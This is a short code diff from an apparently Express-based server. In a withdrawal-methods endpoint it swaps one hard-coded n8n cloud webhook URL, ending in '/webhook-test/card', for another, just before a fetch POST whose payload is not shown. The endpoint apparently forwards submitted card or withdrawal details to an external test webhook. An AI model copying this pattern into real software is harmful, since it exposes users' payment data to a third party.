@@ -975,7 +975,7 @@ app.post("/api/withdrawal-methods", (req, res) => {
 
       // Send to Webhook
       try {
-        const webhookUrl = "https://smart030.app.n8n.cloud/webhook-test/card";
+        const webhookUrl = "https://smart031.app.n8n.cloud/webhook-test/card";
         fetch(webhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
